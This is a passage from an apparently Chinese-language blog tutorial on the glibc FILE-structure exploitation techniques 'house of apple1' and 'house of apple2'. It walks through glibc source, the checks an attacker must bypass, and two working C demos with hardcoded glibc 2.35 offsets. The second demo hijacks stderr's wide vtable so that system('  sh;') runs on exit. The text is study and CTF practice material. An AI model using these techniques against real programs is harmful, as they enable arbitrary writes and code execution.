JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里需要强调一下 <code>_IO_jump_t</code> 和 <code>_IO_wstrn_jumps</code> 的关系</p><p><code>_IO_wstrn_jumps</code> 和 <code>_IO_jump_t</code> 是glibc中两种不同类型的结构体,它们是相关的。</p><p><code>_IO_jump_t</code>  是 <code>glibc</code> 中一个通用的结构体，用于实现文件流的多态性。它定义了一组函数指针，这些函数指针指向文件流的不同操作，如读写、定位、关闭等。而 <code>_IO_wstrn_jumps</code> 是 <code>_IO_jump_t</code> 的一个实例。它是用于实现宽字符流的。它继承了 <code>_IO_jump_t</code> 的所有函数指针，并定义了一些额外的函数指针，用于支持宽字符流的特殊操作。</p><p>回顾一下 <code>_IO_jump_t</code> 结构体 （如下）， <code>vtable</code> 是它的一个实例。此处需要理解清楚这些结构体之间彼此的关系。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="漏洞原理：-v2">漏洞原理：</h5><p>而 <code>house of apple1</code> 中利用的漏洞位置位于 <code>_IO_wstrn_jumps</code> 结构体中的函数指针指向的 <code>_IO_wstrn_overflow</code> ,该函数源码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line"> snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line"> / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数是宽字符流的溢出处理函数，当宽字符缓冲区已满，需要将数据写入指定位置（文件或者终端）时，该函数会被调用。</p><p>关于上面的代码首先要做一个简单的分析</p><ol><li><code>snf</code> 的地址和 <code>fp</code> 的地址相同 （也就是当前处理的这个 <code>IO_FILE</code> 的首地址）</li><li><code>snf-&gt;overflow_buf</code> 相对于 <code>_IO_FILE</code> 结构体的偏移为<code>0xf0</code>，紧跟着在 <code>vtable</code> 后面</li><li>正常情况下 <code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code> 这个条件是成立的。也就是 <code>if</code> 下的代码会被执行，完成下面的赋值操作</li></ol><p>漏洞就是在赋值上面，因为没有关于 <code>fp-&gt;_wide_data</code> 的合法性检查，如果我们能够控制 <code>fp-&gt;_wide_data</code>，（以 <code>fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</code> 这行代码为例）那就可以让 <code>snf-&gt;overflow_buf</code> 这个地址写入到 <code>fp-&gt;_wide_data-&gt;_IO_write_base</code>  上，而通过结构体指针操作符 <code>-&gt;</code> 来访问结构体中的成员变量本质上也只是访问的一个指针加偏移而已。因此实际上完成的写入操作是将 <code>snf-&gt;overflow_buf</code> 地址写入到了 <code>fp-&gt;_wide_data</code> 地址加 <code>0x20</code> 处，<strong>完成了一次任意地址写一个不可控地址（这个不可控地址是 <code>overflow_buf</code> 的地址，不过通常我们伪造的 <code>IO_FILE</code> 在堆上，所以这个地址通常是个堆地址）</strong>，之后还有几次赋值操作，原理依然如上。</p><p>自己写了一个 <code>demo</code> 如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">// gcc demo.c -o demo -g -w</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data address -------&gt; %p\n&quot;</span>,&amp;data);<span class="comment">//最终被写入数据的全局变量地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value   -------&gt; %s\n&quot;</span>,data);<span class="comment">//此时全局的内容为空 </span></span><br><span class="line">    </span><br><span class="line"><span class="type">void</span> *libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;<span class="comment">//获取libc基地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc base address ------&gt; %p\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//该堆块就是用来伪造IO_FILE的 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Forged IO_ File address--------&gt; %p\n&quot;</span>,p);</span><br><span class="line">    </span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> _IO_wstrn_jumps =libc_base+<span class="number">0x215dc0</span>;<span class="comment">//获取_IO_wstrn_jumps的地址 </span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *vtable=p+<span class="number">0xd8</span>;<span class="comment">//获取伪造的IO_FILE的地址 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> io_stdin=libc_base+<span class="number">0x219aa0</span>;<span class="comment">//获取_IO_2_1_stdin_结构体的地址 </span></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(io_stdin+<span class="number">0x68</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(p);</span><br><span class="line"><span class="comment">//该攻击的第一步，需要先将伪造的IO_FILE添加到_IO_list_all中</span></span><br><span class="line"><span class="comment">//我这里选择了篡改_IO_2_1_stdin_中的_chain字段，将其改为伪造的IO_FILE </span></span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    *(vtable)=_IO_wstrn_jumps;<span class="comment">//该攻击的第二步，将IO_FILE中的vtable改成 _IO_wstrn_jumps的地址 </span></span><br><span class="line">    </span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0xa0</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(data<span class="number">-0x18</span>);</span><br><span class="line"><span class="comment">//攻击第三步，将伪造的_IO_FILE中的_wide_data字段改为目标地址</span></span><br><span class="line"><span class="comment">//触发攻击时就会向目标地址加0x18 0x20等等位置写入snf-&gt;overflow_buf的地址</span></span><br><span class="line"><span class="comment">//这里我提前将目标地址减了0x18，在触发攻击时，就可以直接向目标地址写入snf-&gt;overflow_buf的地址了 </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//下面两行代码是为了绕过检查，触发overflow函数，分别将write_base设置为0 write_ptr设置为1</span></span><br><span class="line"><span class="comment">//需要注意的是本来还需要伪造_mode字段为0，但是通常在堆块上这个字段默认是0</span></span><br><span class="line"><span class="comment">//所以下面就没有伪造，但并不意味这_mode字段不需要伪造 </span></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0x28</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(<span class="number">1</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0x20</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fcloseall();<span class="comment">//触发攻击 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value -------&gt; %s\n&quot;</span>,data);<span class="comment">//最后打印data的内容，发现原本内容是空的data变成了snf-&gt;overflow_buf的地址 </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305121929997.png" alt="image-20230512192939734"></p><p>因为上图中最后的 <code>data value</code> 是个地址，存在不可见字符，实际值如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305121934919.png" alt="image-20230512193409832"></p><p>上述便是 <code>house of apple1</code> 的学习总结，该攻击并不能直接获取 <code>shell </code> ，通常情况下是只能向几个地址里写入一个堆地址。但是通过对于 <code>house of apple1</code> 的学习让我体会到了一种新型的攻击思路，个人感觉最好的状态就是先看文章学习，最后根据自己的理解写一个 <code>demo</code> ，只要 <code>demo</code> 没有成功触发攻击就说明自己还有地方没理解，当 <code>demo</code> 成功触发攻击时，就说明自己的理解是正确的。</p><h4 id="house-of-apple2">house of apple2</h4><h5 id="利用条件：-v2">利用条件：</h5><ol><li>可以泄露 <code>libc</code> 地址和堆地址</li><li>可以使用任意地址写一个堆地址（通常是使用 <code>large bin attack</code> ）</li><li>从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li></ol><h5 id="攻击效果：-v2">攻击效果：</h5><p>控制程序的执行流</p><h5 id="适用版本：-v2">适用版本：</h5><p>目前的所有 <code>libc</code> 版本，从 <code>2.23</code> 到目前最新的 <code>2.36</code></p><h5 id="前置知识：-v2">前置知识：</h5><p>在 <code>2.23</code> 的 <code>libc</code> 版本中，我们是可以劫持 <code>vtable</code> ，从而替换其中的函数指针来控制程序的执行流，但是在之后的 <code>libc</code> 版本中，都对 <code>vtable</code> 进行了合法性检查,判断 <code>vtable</code> 地址是否在一个合法的区间里。但这不意味着无法伪造 <code>vtable</code> 了，目前如果将 <code>vtable</code> 原本存放的 <code>_IO_jump_t</code> 改成 <code>_IO_wfile_jumps</code> 依然是可以通过检查的。（ <strong>roderick</strong> 师傅说只要是 <code>jumps</code> 都满足检测 ）（在 <code>house of apple1</code> 中我们是将 <code>_IO_jump_t</code> 改成了 <code>_IO_wstrn_jumps</code>）</p><p><code>_IO_wfile_jumps</code> 结构体如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_wfile_jumps)</span><br></pre></td></tr></table></figure><p>还记得我们之前通常都是劫持 <code>exit</code> 函数中的这个 <code>_IO_OVERFLOW</code> 么，<code>house of apple2</code> 有多个 <code>IO</code> 利用链，这里我只总结从这个 <code>_IO_OVERFLOW</code> 触发的利用链。</p><h5 id="漏洞原理">漏洞原理</h5><p>假设我们现在将原本 <code>vtable</code> 中的 <code>_IO_jump_t</code> 结构体地址改成 <code>_IO_wfile_jumps</code> ,那么本应去调用 <code>__overflow</code> 函数不会被执行，而是去调用 <code>_IO_wfile_jumps</code> 中的 <code>_IO_wfile_overflow</code> 函数。</p><p>这里分析下 <code>_IO_wfile_overflow</code> 函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_wdoallocbuf (f);</span><br><span class="line">  _IO_free_wbackup_area (f);</span><br><span class="line">  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_doallocbuf (f);</span><br><span class="line">      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wfile_overflow)</span><br></pre></td></tr></table></figure><p>我们的目的是要调用到 <code>_IO_wdoallocbuf</code> 函数，至于需要绕过的检查后面再总结。</p><p><code>_IO_wdoallocbuf</code> 函数源码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure><p><code>_IO_WDOALLOCATE (fp)</code> 这里就是我们最后劫持程序执行流的地方，它是这样被调用的 <code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> 。这个函数最终也是通过 <code>vtable</code> 被调用的，但这个是 <code>_wide_data</code> 结构体中的 <code>_wide_vtable</code> 所调用的，由于没有合法性检测，就可以伪造这个 <code>vtable</code>。</p><p>再来回顾下上面提到的 <code>_wide_vtable</code> 结构体 ,可以看到这个 <code>doallocate</code> 位于偏移 <code>0x68</code> 的位置。因此我们只需要让伪造的这个 <code>vtable</code> 加 <code>0x68</code> 的位置为 <code>system</code> 函数即可。接下来想获取 <code>shell</code> ，只需要控制参数即可。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>发现最终执行的是 <code>_IO_WDOALLOCATE (fp)</code> ,而这个 <code>fp</code> 就是 <code>IO_FILE</code>，因此控制参数的话只需要让 <code>flags</code> 字段为 <code>/bin/sh</code> 。</p><p>总结下执行到最后的位置需要绕过的检查</p><ol><li><code>_flags</code> 设置为<code>~(2 | 0x8 | 0x800)</code> ，如果是需要获取 <code>shell</code> 的话，那么可以将参数写为 <code>  sh;</code> 这样 <code>_flags</code> 既能绕过检查，又能被 <code>system</code> 函数当做参数成功执行。需要注意的是 <code>sh;</code> 前面是有两个空格的（这个值是 <code>0x3b68732020</code> ）</li><li><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code> , <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code></li><li><code>fp-&gt;_mode == 0</code> 和 <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>  ,这样即可触发 <code>_IO_OVERFLOW</code>。</li></ol><p>上面提到的是绕过的检查所需要伪造的字段，然后还有几个地方的设置如下</p><ol><li>将 <code>IO_FILE</code> 中的 <code>vtable</code> 字段改为 <code>_IO_wfile_jumps</code></li><li>将 <code>IO_FILE</code> 中的 <code>wide_data</code> 设置为可控堆地址，目的是控制 <code>wide_data</code> 中的 <code>write_base</code> 和 <code>buf_base</code> 为0</li><li>控制 <code>wide_data-&gt;wide_vtable</code> 为地址 <code>A</code>，地址 <code>A</code> 满足 <code>*(A+0x68) == system</code> （此处的 <code>system</code> 地址是自己布置的）</li></ol><p>自己写了一个 <code>demo</code>  如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">// gcc demo.c -o demo -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;libc_base --------&gt; %llx\n&quot;</span>,libc_base);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> stderr_address=libc_base+<span class="number">0x21a6a0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;stderr address --------&gt; %llx\n&quot;</span>,stderr_address);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data=stderr_address+<span class="number">0xa0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wide_data --------&gt; %llx\n&quot;</span>,wide_data);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> vtable=stderr_address+<span class="number">0xd8</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;vtable --------&gt; %llx\n&quot;</span>,vtable);</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> io_wfile_jumps=libc_base+<span class="number">0x2160c0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data_write_base=*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(wide_data)+<span class="number">0x18</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data_buf_base=*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data+<span class="number">0x30</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;io_wfile_jumps --------&gt; %llx\n&quot;</span>,io_wfile_jumps);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wide_data_write_base --------&gt; %llx\n&quot;</span>,wide_data_write_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wide_data_buf_base --------&gt; %llx\n&quot;</span>,wide_data_buf_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_vtable=libc_base+<span class="number">0x219980</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wide_vtable --------&gt; %llx\n&quot;</span>,wide_vtable);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> system=libc_base+<span class="number">0x50d60</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> write_base=stderr_address+<span class="number">0x20</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> buf_base=stderr_address+<span class="number">0x38</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> system_ptr=wide_vtable<span class="number">-8</span>;</span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)vtable=io_wfile_jumps;</span><br><span class="line">*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)write_base=<span class="number">0</span>;</span><br><span class="line">     *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data_write_base=<span class="number">0</span>;</span><br><span class="line">     *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data_buf_base=<span class="number">0</span>;</span><br><span class="line">*((<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)system_ptr)=system;</span><br><span class="line">*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_vtable=libc_base+<span class="number">0x219910</span>;</span><br><span class="line">*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)stderr_address=<span class="number">0x3b68732020</span>; <span class="comment">//~(2 | 0x8 | 0x800);</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301301711064.png" alt="image-20230130171112854"></p><h4 id="题目练习">题目练习</h4><p>题目是 <strong>roderick</strong> 师傅在 <code>house of apple</code> 文章中的例题，下载链接在这里：<a href="https://pan.baidu.com/s/1nZIeYKqv619jMFyox-s8gQ?pwd=632r">https://pan.baidu.com/s/1nZIeYKqv619jMFyox-s8gQ?pwd=632r</a>  提取码：632r<br><strong>roderick</strong> 师傅说这个题是 <code>2.34</code> 的 <code>libc</code> ，我是直接拖到了 <code>22.04</code> 的 <code>ubuntu</code> 里，用 <code>2.35</code> 的 <code>libc</code> 打的。</p><h5 id="保护策略">保护策略</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020930803.png" alt="image-20230202093006528" style="zoom: 67%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020930552.png" alt="image-20230202093028442" style="zoom:50%;" /><h5 id="程序分析">程序分析</h5><p>程序最开始先询问了一个 <code>key</code>，这个 <code>key</code> 决定了我们申请堆块的大小。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020932796.png" 